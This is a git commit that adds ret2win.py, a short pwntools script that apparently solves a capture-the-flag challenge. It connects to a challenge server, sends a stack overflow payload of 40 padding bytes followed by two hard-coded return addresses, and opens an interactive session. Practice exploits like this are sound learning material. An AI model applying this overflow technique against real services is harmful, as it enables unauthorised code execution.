011680ba7e76c39dd155afb30d98e96a984b646f
Navinduvin <71208443+navin-duvin@users.noreply.github.com>
2021-10-25 14:20:33 +0530

    Create ret2win.py

---
+++ ret2win.py
@@ -0,0 +1,11 @@
+#!/usr/bin/env python
+from pwn import *
+
+fil = remote('pwn.chall.pwnoh.io', 13379)
+
+payload = b'a'*40
+payload += p64(0x4011E0)
+payload += p64(0x401245)
+
+fil.send(payload)
+fil.interactive()
